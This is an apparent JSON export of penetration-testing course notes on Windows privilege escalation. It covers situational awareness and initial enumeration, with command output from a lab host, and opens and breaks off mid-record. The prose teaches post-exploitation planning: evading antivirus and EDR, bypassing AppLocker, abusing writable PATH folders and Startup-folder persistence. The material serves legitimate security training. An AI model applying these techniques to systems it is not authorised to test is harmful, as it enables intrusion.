avenues of attack within the network.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/17-Windows Privilege Escalation/04-Situational Awareness",
    "path": "02_CPTS/17-Windows Privilege Escalation/04-Situational Awareness.md",
    "title": "04 Situational Awareness",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Situational Awareness --- When placed in any situation, whether in our day-to-day lives or during a project such as a network penetration test, it is always important to orient ourselves in space and ...",
    "category": "02_CPTS",
    "content": "# Situational Awareness\n\n---\n\nWhen placed in any situation, whether in our day-to-day lives or during a project such as a network penetration test, it is always important to orient ourselves in space and time. We cannot function and react effectively without an understanding of our current surroundings. We require this information to make informed decisions about our next steps to operate proactively instead of reactively. When we land on a Windows or Linux system intending to escalate privileges next, there are several things we should always look for to plan out our next moves. We may find other hosts that we can access directly, protections in place that will need to be bypassed, or find that certain tools will not work against the system in question.\n\n---\n\n## Network Information\n\nGathering network information is a crucial part of our enumeration. We may find that the host is dual-homed and that compromising the host may allow us to move laterally into another part of the network that we could not access previously. Dual-homed means that the host or server belongs to two or more different networks and, in most cases, has several virtual or physical network interfaces. We should always look at [routing tables](https://en.wikipedia.org/wiki/Routing_table) to view information about the local network and networks around it. We can also gather information about the local domain (if the host is part of an Active Directory environment), including the IP addresses of domain controllers. It is also important to use the [arp](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/arp) command to view the ARP cache for each interface and view other hosts the host has recently communicated with. This could help us with lateral movement after obtaining credentials. It could be a good indication of which hosts administrators are connecting to via RDP or WinRM from this host.\n\nThis network information may help directly or indirectly with our local privilege escalation. It may lead us down another path to a system that we can access or escalate privileges on or reveal information that we can use for lateral movement to further our access after escalating privileges on the current system.\n\n#### Interface(s), IP Address(es), DNS Information\n\nSituational Awareness\n\n```cmd-session\nC:\\htb> ipconfig /all\n\nWindows IP Configuration\n\n   Host Name . . . . . . . . . . . . : WINLPE-SRV01\n   Primary Dns Suffix  . . . . . . . :\n   Node Type . . . . . . . . . . . . : Hybrid\n   IP Routing Enabled. . . . . . . . : No\n   WINS Proxy Enabled. . . . . . . . : No\n   DNS Suffix Search List. . . . . . : .htb\n\nEthernet adapter Ethernet1:\n\n   Connection-specific DNS Suffix  . :\n   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter\n   Physical Address. . . . . . . . . : 00-50-56-B9-C5-4B\n   DHCP Enabled. . . . . . . . . . . : No\n   Autoconfiguration Enabled . . . . : Yes\n   Link-local IPv6 Address . . . . . : fe80::f055:fefd:b1b:9919%9(Preferred)\n   IPv4 Address. . . . . . . . . . . : 192.168.20.56(Preferred)\n   Subnet Mask . . . . . . . . . . . : 255.255.255.0\n   Default Gateway . . . . . . . . . : 192.168.20.1\n   DHCPv6 IAID . . . . . . . . . . . : 151015510\n   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-27-ED-DB-68-00-50-56-B9-90-94\n   DNS Servers . . . . . . . . . . . : 8.8.8.8\n   NetBIOS over Tcpip. . . . . . . . : Enabled\n\nEthernet adapter Ethernet0:\n\n   Connection-specific DNS Suffix  . : .htb\n   Description . . . . . . . . . . . : Intel(R) 82574L Gigabit Network Connection\n   Physical Address. . . . . . . . . : 00-50-56-B9-90-94\n   DHCP Enabled. . . . . . . . . . . : Yes\n   Autoconfiguration Enabled . . . . : Yes\n   IPv6 Address. . . . . . . . . . . : dead:beef::e4db:5ea3:2775:8d4d(Preferred)\n   Link-local IPv6 Address . . . . . : fe80::e4db:5ea3:2775:8d4d%4(Preferred)\n   IPv4 Address. . . . . . . . . . . : 10.129.43.8(Preferred)\n   Subnet Mask . . . . . . . . . . . : 255.255.0.0\n   Lease Obtained. . . . . . . . . . : Thursday, March 25, 2021 9:24:45 AM\n   Lease Expires . . . . . . . . . . : Monday, March 29, 2021 1:28:44 PM\n   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:4ddf%4\n                                       10.129.0.1\n   DHCP Server . . . . . . . . . . . : 10.129.0.1\n   DHCPv6 IAID . . . . . . . . . . . : 50352214\n   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-27-ED-DB-68-00-50-56-B9-90-94\n   DNS Servers . . . . . . . . . . . : 1.1.1.1\n                                       8.8.8.8\n   NetBIOS over Tcpip. . . . . . . . : Enabled\n\nTunnel adapter isatap..htb:\n\n   Media State . . . . . . . . . . . : Media disconnected\n   Connection-specific DNS Suffix  . : .htb\n   Description . . . . . . . . . . . : Microsoft ISATAP Adapter\n   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0\n   DHCP Enabled. . . . . . . . . . . : No\n   Autoconfiguration Enabled . . . . : Yes\n\nTunnel adapter Teredo Tunneling Pseudo-Interface:\n\n   Media State . . . . . . . . . . . : Media disconnected\n   Connection-specific DNS Suffix  . :\n   Description . . . . . . . . . . . : Teredo Tunneling Pseudo-Interface\n   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0\n   DHCP Enabled. . . . . . . . . . . : No\n   Autoconfiguration Enabled . . . . : Yes\n\nTunnel adapter isatap.{02D6F04C-A625-49D1-A85D-4FB454FBB3DB}:\n\n   Media State . . . . . . . . . . . : Media disconnected\n   Connection-specific DNS Suffix  . :\n   Description . . . . . . . . . . . : Microsoft ISATAP Adapter #2\n   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0\n   DHCP Enabled. . . . . . . . . . . : No\n   Autoconfiguration Enabled . . . . : Yes\n```\n\n#### ARP Table\n\nSituational Awareness\n\n```cmd-session\nC:\\htb> arp -a\n\nInterface: 10.129.43.8 --- 0x4\n  Internet Address      Physical Address      Type\n  10.129.0.1            00-50-56-b9-4d-df     dynamic\n  10.129.43.12          00-50-56-b9-da-ad     dynamic\n  10.129.43.13          00-50-56-b9-5b-9f     dynamic\n  10.129.255.255        ff-ff-ff-ff-ff-ff     static\n  224.0.0.22            01-00-5e-00-00-16     static\n  224.0.0.252           01-00-5e-00-00-fc     static\n  224.0.0.253           01-00-5e-00-00-fd     static\n  239.255.255.250       01-00-5e-7f-ff-fa     static\n  255.255.255.255       ff-ff-ff-ff-ff-ff     static\n\nInterface: 192.168.20.56 --- 0x9\n  Internet Address      Physical Address      Type\n  192.168.20.255        ff-ff-ff-ff-ff-ff     static\n  224.0.0.22            01-00-5e-00-00-16     static\n  224.0.0.252           01-00-5e-00-00-fc     static\n  239.255.255.250       01-00-5e-7f-ff-fa     static\n  255.255.255.255       ff-ff-ff-ff-ff-ff     static\n```\n\n#### Routing Table\n\nSituational Awareness\n\n```cmd-session\nC:\\htb> route print\n\n===========================================================================\nInterface List\n  9...00 50 56 b9 c5 4b ......vmxnet3 Ethernet Adapter\n  4...00 50 56 b9 90 94 ......Intel(R) 82574L Gigabit Network Connection\n  1...........................Software Loopback Interface 1\n  3...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter\n  5...00 00 00 00 00 00 00 e0 Teredo Tunneling Pseudo-Interface\n 13...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter #2\n===========================================================================\n\nIPv4 Route Table\n===========================================================================\nActive Routes:\nNetwork Destination        Netmask          Gateway       Interface  Metric\n          0.0.0.0          0.0.0.0       10.129.0.1      10.129.43.8     25\n          0.0.0.0          0.0.0.0     192.168.20.1    192.168.20.56    271\n       10.129.0.0      255.255.0.0         On-link       10.129.43.8    281\n      10.129.43.8  255.255.255.255         On-link       10.129.43.8    281\n   10.129.255.255  255.255.255.255         On-link       10.129.43.8    281\n        127.0.0.0        255.0.0.0         On-link         127.0.0.1    331\n        127.0.0.1  255.255.255.255         On-link         127.0.0.1    331\n  127.255.255.255  255.255.255.255         On-link         127.0.0.1    331\n     192.168.20.0    255.255.255.0         On-link     192.168.20.56    271\n    192.168.20.56  255.255.255.255         On-link     192.168.20.56    271\n   192.168.20.255  255.255.255.255         On-link     192.168.20.56    271\n        224.0.0.0        240.0.0.0         On-link         127.0.0.1    331\n        224.0.0.0        240.0.0.0         On-link       10.129.43.8    281\n        224.0.0.0        240.0.0.0         On-link     192.168.20.56    271\n  255.255.255.255  255.255.255.255         On-link         127.0.0.1    331\n  255.255.255.255  255.255.255.255         On-link       10.129.43.8    281\n  255.255.255.255  255.255.255.255         On-link     192.168.20.56    271\n===========================================================================\nPersistent Routes:\n  Network Address          Netmask  Gateway Address  Metric\n          0.0.0.0          0.0.0.0     192.168.20.1  Default\n===========================================================================\n\nIPv6 Route Table\n===========================================================================\nActive Routes:\n If Metric Network Destination      Gateway\n  4    281 ::/0                     fe80::250:56ff:feb9:4ddf\n  1    331 ::1/128                  On-link\n  4    281 dead:beef::/64           On-link\n  4    281 dead:beef::e4db:5ea3:2775:8d4d/128\n                                    On-link\n  4    281 fe80::/64                On-link\n  9    271 fe80::/64                On-link\n  4    281 fe80::e4db:5ea3:2775:8d4d/128\n                                    On-link\n  9    271 fe80::f055:fefd:b1b:9919/128\n                                    On-link\n  1    331 ff00::/8                 On-link\n  4    281 ff00::/8                 On-link\n  9    271 ff00::/8                 On-link\n===========================================================================\nPersistent Routes:\n  None\n```\n\n---\n\n## Enumerating Protections\n\nMost modern environments have some sort of anti-virus or Endpoint Detection and Response (EDR) service running to monitor, alert on, and block threats proactively. These tools may interfere with the enumeration process. They will very likely present some sort of challenge during the privilege escalation process, especially if we are using some kind of public PoC exploit or tool. Enumerating protections in place will help us ensure that we are using methods that are not being blocked or detected and will help us if we have to craft custom payloads or modify tools before compiling them.\n\nMany organizations utilize some sort of application whitelisting solution to control what types of applications and files certain users can run. This may be used to attempt to block non-admin users from running `cmd.exe` or `powershell.exe` or other binaries and file types not needed for their day-to-day work. A popular solution offered by Microsoft is [AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/applocker-overview). We can use the [GetAppLockerPolicy](https://docs.microsoft.com/en-us/powershell/module/applocker/get-applockerpolicy?view=windowsserver2019-ps) cmdlet to enumerate the local, effective (enforced), and domain AppLocker policies. This will help us see what binaries or file types may be blocked and whether we will have to perform some sort of AppLocker bypass either during our enumeration or before running a tool or technique to escalate privileges.\n\nIn a real-world engagement, the client will likely have protections in place that detect the most common tools/scripts (including those introduced in the previous section). There are ways to deal with these, and enumerating the protections in use can help us modify our tools in a lab environment and test them before using them against a client system. Some EDR tools detect on or even block usage of common binaries such as `net.exe`, `tasklist`, etc. Organizations may restrict what binaries a user can run or immediately flag suspicious activities, such as an accountant's machine showing specific binaries being run via cmd.exe. Early enumeration and a deep understanding of the client's environment and workarounds against common AV and EDR solutions can save us time during a non-evasive engagement and make or break an evasive engagement.\n\n#### Check Windows Defender Status\n\nSituational Awareness\n\n```powershell-session\nPS C:\\htb> Get-MpComputerStatus\n\nAMEngineVersion                 : 1.1.17900.7\nAMProductVersion                : 4.10.14393.2248\nAMServiceEnabled                : True\nAMServiceVersion                : 4.10.14393.2248\nAntispywareEnabled              : True\nAntispywareSignatureAge         : 1\nAntispywareSignatureLastUpdated : 3/28/2021 2:59:13 AM\nAntispywareSignatureVersion     : 1.333.1470.0\nAntivirusEnabled                : True\nAntivirusSignatureAge           : 1\nAntivirusSignatureLastUpdated   : 3/28/2021 2:59:12 AM\nAntivirusSignatureVersion       : 1.333.1470.0\nBehaviorMonitorEnabled          : False\nComputerID                      : 54AF7DE4-3C7E-4DA0-87AC-831B045B9063\nComputerState                   : 0\nFullScanAge                     : 4294967295\nFullScanEndTime                 :\nFullScanStartTime               :\nIoavProtectionEnabled           : False\nLastFullScanSource              : 0\nLastQuickScanSource             : 0\nNISEnabled                      : False\nNISEngineVersion                : 0.0.0.0\nNISSignatureAge                 : 4294967295\nNISSignatureLastUpdated         :\nNISSignatureVersion             : 0.0.0.0\nOnAccessProtectionEnabled       : False\nQuickScanAge                    : 4294967295\nQuickScanEndTime                :\nQuickScanStartTime              :\nRealTimeProtectionEnabled       : False\nRealTimeScanDirection           : 0\nPSComputerName                  :\n```\n\n#### List AppLocker Rules\n\nSituational Awareness\n\n```powershell-session\nPS C:\\htb> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections\n\nPublisherConditions : {*\\*\\*,0.0.0.0-*}\nPublisherExceptions : {}\nPathExceptions      : {}\nHashExceptions      : {}\nId                  : a9e18c21-ff8f-43cf-b9fc-db40eed693ba\nName                : (Default Rule) All signed packaged apps\nDescription         : Allows members of the Everyone group to run packaged apps that are signed.\nUserOrGroupSid      : S-1-1-0\nAction              : Allow\n\nPathConditions      : {%PROGRAMFILES%\\*}\nPathExceptions      : {}\nPublisherExceptions : {}\nHashExceptions      : {}\nId                  : 921cc481-6e17-4653-8f75-050b80acca20\nName                : (Default Rule) All files located in the Program Files folder\nDescription         : Allows members of the Everyone group to run applications that are located in the Program Files\n                      folder.\nUserOrGroupSid      : S-1-1-0\nAction              : Allow\n\nPathConditions      : {%WINDIR%\\*}\nPathExceptions      : {}\nPublisherExceptions : {}\nHashExceptions      : {}\nId                  : a61c8b2c-a319-4cd0-9690-d2177cad7b51\nName                : (Default Rule) All files located in the Windows folder\nDescription         : Allows members of the Everyone group to run applications that are located in the Windows folder.\nUserOrGroupSid      : S-1-1-0\nAction              : Allow\n\nPathConditions      : {*}\nPathExceptions      : {}\nPublisherExceptions : {}\nHashExceptions      : {}\nId                  : fd686d83-a829-4351-8ff4-27c7de5755d2\nName                : (Default Rule) All files\nDescription         : Allows members of the local Administrators group to run all applications.\nUserOrGroupSid      : S-1-5-32-544\nAction              : Allow\n\nPublisherConditions : {*\\*\\*,0.0.0.0-*}\nPublisherExceptions : {}\nPathExceptions      : {}\nHashExceptions      : {}\nId                  : b7af7102-efde-4369-8a89-7a6a392d1473\nName                : (Default Rule) All digitally signed Windows Installer files\nDescription         : Allows members of the Everyone group to run digitally signed Windows Installer files.\nUserOrGroupSid      : S-1-1-0\nAction              : Allow\n\nPathConditions      : {%WINDIR%\\Installer\\*}\nPathExceptions      : {}\nPublisherExceptions : {}\nHashExceptions      : {}\nId                  : 5b290184-345a-4453-b184-45305f6d9a54\nName                : (Default Rule) All Windows Installer files in %systemdrive%\\Windows\\Installer\nDescription         : Allows members of the Everyone group to run all Windows Installer files located in\n                      %systemdrive%\\Windows\\Installer.\nUserOrGroupSid      : S-1-1-0\nAction              : Allow\n\nPathConditions      : {*.*}\nPathExceptions      : {}\nPublisherExceptions : {}\nHashExceptions      : {}\nId                  : 64ad46ff-0d71-4fa0-a30b-3f3d30c5433d\nName                : (Default Rule) All Windows Installer files\nDescription         : Allows members of the local Administrators group to run all Windows Installer files.\nUserOrGroupSid      : S-1-5-32-544\nAction              : Allow\n\nPathConditions      : {%PROGRAMFILES%\\*}\nPathExceptions      : {}\nPublisherExceptions : {}\nHashExceptions      : {}\nId                  : 06dce67b-934c-454f-a263-2515c8796a5d\nName                : (Default Rule) All scripts located in the Program Files folder\nDescription         : Allows members of the Everyone group to run scripts that are located in the Program Files folder.\nUserOrGroupSid      : S-1-1-0\nAction              : Allow\n\nPathConditions      : {%WINDIR%\\*}\nPathExceptions      : {}\nPublisherExceptions : {}\nHashExceptions      : {}\nId                  : 9428c672-5fc3-47f4-808a-a0011f36dd2c\nName                : (Default Rule) All scripts located in the Windows folder\nDescription         : Allows members of the Everyone group to run scripts that are located in the Windows folder.\nUserOrGroupSid      : S-1-1-0\nAction              : Allow\n\nPathConditions      : {*}\nPathExceptions      : {}\nPublisherExceptions : {}\nHashExceptions      : {}\nId                  : ed97d0cb-15ff-430f-b82c-8d7832957725\nName                : (Default Rule) All scripts\nDescription         : Allows members of the local Administrators group to run all scripts.\nUserOrGroupSid      : S-1-5-32-544\nAction              : Allow\n```\n\n#### Test AppLocker Policy\n\nSituational Awareness\n\n```powershell-session\nPS C:\\htb> Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\\Windows\\System32\\cmd.exe -User Everyone\n\nFilePath                    PolicyDecision MatchingRule\n--------                    -------------- ------------\nC:\\Windows\\System32\\cmd.exe         Denied c:\\windows\\system32\\cmd.exe\n```\n\n---\n\n## Next Steps\n\nNow that we have gathered network information about the host and enumerated any protections in place, we can decide which tools or manual techniques to use in the subsequent enumeration phases and any additional possible avenues of attack within the network.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/17-Windows Privilege Escalation/05-Initial Enumeration",
    "path": "02_CPTS/17-Windows Privilege Escalation/05-Initial Enumeration.md",
    "title": "05 Initial Enumeration",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Initial Enumeration --- During an assessment, we may gain a low-privileged shell on a Windows host (domain-joined or not) and need to perform privilege escalation to further our access. Fully compromi...",
    "category": "02_CPTS",
    "content": "# Initial Enumeration\n\n---\n\nDuring an assessment, we may gain a low-privileged shell on a Windows host (domain-joined or not) and need to perform privilege escalation to further our access. Fully compromising the host may gain us access to sensitive files/file shares, grant us the ability to capture traffic to obtain more credentials, or obtain credentials that can help further our access or even escalate directly to Domain Admin in an Active Directory environment. We can escalate privileges to one of the following depending on the system configuration and what type of data we encounter:\n\n||\n|---|\n|The highly privileged `NT AUTHORITY\\SYSTEM` account, or [LocalSystem](https://docs.microsoft.com/en-us/windows/win32/services/localsystem-account) account which is a highly privileged account with more privileges than a local administrator account and is used to run most Windows services.|\n|The built-in local `administrator` account. Some organizations disable this account, but many do not. It is not uncommon to see this account reused across multiple systems in a client environment.|\n|Another local account that is a member of the local `Administrators` group. Any account in this group will have the same privileges as the built-in `administrator` account.|\n|A standard (non-privileged) domain user who is part of the local `Administrators` group.|\n|A domain admin (highly privileged in the Active Directory environment) that is part of the local `Administrators` group.|\n\nEnumeration is the key to privilege escalation. When we gain initial shell access to the host, it is vital to gain situational awareness and uncover details relating to the OS version, patch level, installed software, current privileges, group memberships, and more. Let's walk through some of the key data points that we should be reviewing after gaining initial access. This is not an exhaustive list by any means, and the various enumeration scripts/tools that we covered in the previous section cover all of these data points and many, many more. Nonetheless, it is essential to understand how to perform these tasks manually, especially if we find ourselves in an environment where we cannot load tools due to network restrictions, lack of internet access, or protections in place.\n\nThis [Windows commands reference](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/windows-commands) is very handy for performing manual enumeration tasks.\n\n---\n\n## Key Data Points\n\n`OS name`: Knowing the type of Windows OS (workstation or server) and level (Windows 7 or 10, Server 2008, 2012, 2016, 2019, etc.) will give us an idea of the types of tools that may be available (such as the `PowerShell` version), or lack thereof on legacy systems. This would also identify the operating system version for which there may be public exploits available.\n\n`Version`: As with the OS [version](https://en.wikipedia.org/wiki/Comparison_of_Microsoft_Windows_versions), there may be public exploits that target a vulnerability in a specific version of Windows. Windows system exploits can cause system instability or even a complete crash. Be careful running these against any production system, and make sure you fully understand the exploit and possible ramifications before running one.\n\n`Running Services`: Knowing what services are running on the host is important, especially those running as `NT AUTHORITY\\SYSTEM` or an administrator-level account. A misconfigured or vulnerable service running in the context of a privileged account can be an easy win for privilege escalation.\n\nLet's take a more in-depth look.\n\n---\n\n## System Information\n\nLooking at the system itself will give us a better idea of the exact operating system version, hardware in use, installed programs, and security updates. This will help us narrow down our hunt for any missing patches and associated CVEs that we may be able to leverage to escalate privileges. Using the [tasklist](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/tasklist) command to look at running processes will give us a better idea of what applications are currently running on the system.\n\n#### Tasklist\n\nInitial Enumeration\n\n```cmd-session\nC:\\htb> tasklist /svc\n\nImage Name                     PID Services\n========================= ======== ============================================\nSystem Idle Process              0 N/A\nSystem                           4 N/A\nsmss.exe                       316 N/A\ncsrss.exe                      424 N/A\nwininit.exe                    528 N/A\ncsrss.exe                      540 N/A\nwinlogon.exe                   612 N/A\nservices.exe                   664 N/A\nlsass.exe                      672 KeyIso, SamSs, VaultSvc\nsvchost.exe                    776 BrokerInfrastructure, DcomLaunch, LSM,\n                                   PlugPlay, Power, SystemEventsBroker\nsvchost.exe                    836 RpcEptMapper, RpcSs\nLogonUI.exe                    952 N/A\ndwm.exe                        964 N/A\nsvchost.exe                    972 TermService\nsvchost.exe                   1008 Dhcp, EventLog, lmhosts, TimeBrokerSvc\nsvchost.exe                    364 NcbService, PcaSvc, ScDeviceEnum, TrkWks,\n                                   UALSVC, UmRdpService\n<...SNIP...>\n\nsvchost.exe                   1468 Wcmsvc\nsvchost.exe                   1804 PolicyAgent\nspoolsv.exe                   1884 Spooler\nsvchost.exe                   1988 W3SVC, WAS\nsvchost.exe                   1996 ftpsvc\nsvchost.exe                   2004 AppHostSvc\nFileZilla Server.exe          1140 FileZilla Server\ninetinfo.exe                  1164 IISADMIN\nsvchost.exe                   1736 DiagTrack\nsvchost.exe                   2084 StateRepository, tiledatamodelsvc\nVGAuthService.exe             2100 VGAuthService\nvmtoolsd.exe                  2112 VMTools\nMsMpEng.exe                   2136 WinDefend\n\n<...SNIP...>\n\nFileZilla Server Interfac     5628 N/A\njusched.exe                   5796 N/A\ncmd.exe                       4132 N/A\nconhost.exe                   4136 N/A\nTrustedInstaller.exe          1120 TrustedInstaller\nTiWorker.exe                  1816 N/A\nWmiApSrv.exe                  2428 wmiApSrv\ntasklist.exe                  3596 N/A\n```\n\nIt is essential to become familiar with standard Windows processes such as [Session Manager Subsystem (smss.exe)](https://en.wikipedia.org/wiki/Session_Manager_Subsystem), [Client Server Runtime Subsystem (csrss.exe)](https://en.wikipedia.org/wiki/Client/Server_Runtime_Subsystem), [WinLogon (winlogon.exe)](https://en.wikipedia.org/wiki/Winlogon), [Local Security Authority Subsystem Service (LSASS)](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service), and [Service Host (svchost.exe)](https://en.wikipedia.org/wiki/Svchost.exe), among others and the services associated with them. Being able to spot standard processes/services quickly will help speed up our enumeration and enable us to hone in on non-standard processes/services, which may open up a privilege escalation path. In the example above, we would be most interested in the `FileZilla` FTP server running and would attempt to enumerate the version to look for public vulnerabilities or misconfigurations such as FTP anonymous access, which could lead to sensitive data exposure or more.\n\nOther processes such as `MsMpEng.exe`, Windows Defender, are interesting because they can help us map out what protections are in place on the target host that we may have to evade/bypass.\n\n#### Display All Environment Variables\n\nThe environment variables explain a lot about the host configuration. To get a printout of them, Windows provides the `set` command. One of the most overlooked variables is `PATH`. In the output below, nothing is out of the ordinary. However, it is not uncommon to find administrators (or applications) modify the `PATH`. One common example is to place Python or Java in the path, which would allow the execution of Python or . JAR files. If the folder placed in the PATH is writable by your user, it may be possible to perform DLL Injections against other applications. Remember, when running a program, Windows looks for that program in the CWD (Current Working Directory) first, then from the PATH going left to right. This means if the custom path is placed on the left (before C:\\Windows\\System32), it is much more dangerous than on the right.\n\nIn addition to the PATH, `set` can also give up other helpful information such as the HOME DRIVE. In enterprises, this will often be a file share. Navigating to the file share itself may reveal other directories that can be accessed. It is not unheard of to be able to access an \"IT Directory,\" which contains an inventory spreadsheet that includes passwords. Additionally, shares are utilized for home directories so the user can log on to other computers and have the same experience/files/desktop/etc. ([Roaming Profiles](https://docs.microsoft.com/en-us/windows-server/storage/folder-redirection/folder-redirection-rup-overview)). This may also mean the user takes malicious items with them. If a file is placed in `USERPROFILE\\AppData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup`, when the user logs into a different machine, this file will execute.\n\nInitial Enumeration\n\n```cmd-session\nC:\\htb> set\n\nALLUSERSPROFILE=C:\\ProgramData\nAPPDATA=C:\\Users\\Administrator\\AppData\\Roaming\nCommonProgramFiles=C:\\Program Files\\Common Files\nCommonProgramFiles(x86)=C:\\Program Files (x86)\\Common Files\nCommonProgramW6432=C:\\Program Files\\Common Files\nCOMPUTERNAME=WINLPE-SRV01\nComSpec=C:\\Windows\\system32\\cmd.exe\nHOMEDRIVE=C:\nHOMEPATH=\\Users\\Administrator\nLOCALAPPDATA=C:\\Users\\Administrator\\AppData\\Local\nLOGONSERVER=\\\\WINLPE-SRV01\nNUMBER_OF_PROCESSORS=6\nOS=Windows_NT\nPath=C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\WindowsApps;\nPATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC\nPROCESSOR_ARCHITECTURE=AMD64\nPROCESSOR_IDENTIFIER=AMD64 Family 23 Model 49 Stepping 0, AuthenticAMD\nPROCESSOR_LEVEL=23\nPROCESSOR_REVISION=3100\nProgramData=C:\\ProgramData\nProgramFiles=C:\\Program Files\nProgramFiles(x86)=C:\\Program Files (x86)\nProgramW6432=C:\\Program Files\nPROMPT=$P$G\nPSModulePath=C:\\Program Files\\WindowsPowerShell\\Modules;C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\Modules\nPUBLIC=C:\\Users\\Public\nSESSIONNAME=Console\nSystemDrive=C:\nSystemRoot=C:\\Windows\nTEMP=C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\1\nTMP=C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\1\nUSERDOMAIN=WINLPE-SRV01\nUSERDOMAIN_ROAMINGPROFILE=WINLPE-SRV01\nUSERNAME=Administrator\nUSERPROFILE=C:\\Users\\Administrator\nwindir=C:\\Windows \n```\n\n#### View Detailed Configuration Information\n\nThe `systeminfo` command will show if the box has been patched recently and if it is a VM. If the box has not been patched recently, getting administrator-level access may be as simple as running a known exploit. Google the KBs installed under [HotFixes](https://www.catalog.update.microsoft.com/Search.aspx?q=hotfix) to get an idea of when the box has been patched. This information isn't always present, as it is possible to hide hotfixes software from non-administrators. The `System Boot Time` and `OS Version` can also be checked to get an idea of the patch level. If the box has not been restarted in over six months, chances are it is also not being patched.\n\nAdditionally, many guides will say the Network Information is important as it could indicate a dual-homed machine (connected to multiple networks). Generally speaking, when it comes to enterprises, devices will just be granted access to other networks via a firewall rule and not have a physical cable run to them.\n\nInitial Enumeration\n\n```cmd-session\nC:\\htb> systeminfo\n\nHost Name:                 WINLPE-SRV01\nOS Name:                   Microsoft Windows Server 2016 Standard\nOS Version:                10.0.14393 N/A Build 14393\nOS Manufacturer:           Microsoft Corporation\nOS Configuration:          Standalone Server\nOS Build Type:             Multiprocessor Free\nRegistered Owner:          Windows User\nRegistered Organization:\nProduct ID:                00376-30000-00299-AA303\nOriginal Install Date:     3/24/2021, 3:46:32 PM\nSystem Boot Time:          3/25/2021, 9:24:36 AM\nSystem Manufacturer:       VMware, Inc.\nSystem Model:              VMware7,1\nSystem Type:               x64-based PC\nProcessor(s):              3 Processor(s) Installed.\n                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz\n                           [02]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz\n                           [03]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz\nBIOS Version:              VMware, Inc. VMW71.00V.16707776.B64.2008070230, 8/7/2020\nWindows Directory:         C:\\Windows\nSystem Directory:          C:\\Windows\\system32\nBoot Device:               \\Device\\HarddiskVolume2\nSystem Locale:             en-us;English (United States)\nInput Locale:              en-us;English (United States)\nTime Zone:                 (UTC-08:00) Pacific Time (US & Canada)\nTotal Physical Memory:     6,143 MB\nAvailable Physical Memory: 3,474 MB\nVirtual Memory: Max Size:  10,371 MB\nVirtual Memory: Available: 7,544 MB\nVirtual Memory: In Use:    2,827 MB\nPage File Location(s):     C:\\pagefile.sys\nDomain:                    WORKGROUP\nLogon Server:              \\\\WINLPE-SRV01\nHotfix(s):                 3 Hotfix(s) Installed.\n                           [01]: KB3199986\n                           [02]: KB5001078\n                           [03]: KB4103723\nNetwork Card(s):           2 NIC(s) Installed.\n                           [01]: Intel(R) 82574L Gigabit Network Connection\n                                 Connection Name: Ethernet0\n                                 DHCP Enabled:    Yes\n                                 DHCP Server:     10.129.0.1\n                                 IP address(es)\n                                 [01]: 10.129.43.8\n                                 [02]: fe80::e4db:5ea3:2775:8d4d\n                                 [03]: dead:beef::e4db:5ea3:2775:8d4d\n                           [02]: vmxnet3 Ethernet Adapter\n                                 Connection Name: Ethernet1\n                                 DHCP Enabled:    No\n                                 IP address(es)\n                                 [01]: 192.168.20.56\n                                 [02]: fe80::f055:fefd:b1b:9919\nHyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.\n```\n\n#### Patches and Updates\n\nIf `systeminfo` doesn't display hotfixes, they may be queriable with [WMI](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) using the WMI-Command binary with [QFE (Quick Fix Engineering)](https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-quickfixengineering) to display patches.\n\nInitial Enumeration\n\n```cmd-session\nC:\\htb> wmic qfe\n\nCaption                                     CSName        Description      FixComments  HotFixID   InstallDate  InstalledBy          InstalledOn  Name  ServicePackInEffect  Status\nhttp://support.microsoft.com/?kbid=3199986  WINLPE-SRV01  Update                        KB3199986               NT AUTHORITY\\SYSTEM  11/21/2016\nhttps://support.microsoft.com/help/5001078  WINLPE-SRV01  Security Update               KB5001078               NT AUTHORITY\\SYSTEM  3/25/2021\nhttp://support.microsoft.com/?kbid=4103723  WINLPE-SRV01  Security Update               KB4103723               NT AUTHORITY\\SYSTEM  3/25/2021\n```\n\nWe can do this with PowerShell as well using the [Get-Hotfix](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-hotfix?view=powershell-7.1) cmdlet.\n\nInitial Enumeration\n\n```powershell-session\nPS C:\\htb> Get-HotFix | ft -AutoSize\n\nSource       Description     HotFixID  InstalledBy                InstalledOn\n------       -----------     --------  -----------                -----------\nWINLPE-SRV01 Update          KB3199986 NT AUTHORITY\\SYSTEM        11/21/2016 12:00:00 AM\nWINLPE-SRV01 Update          KB4054590 WINLPE-SRV01\\Administrator 3/30/2021 12:00:00 AM\nWINLPE-SRV01 Security Update KB5001078 NT AUTHORITY\\SYSTEM        3/25/2021 12:00:00 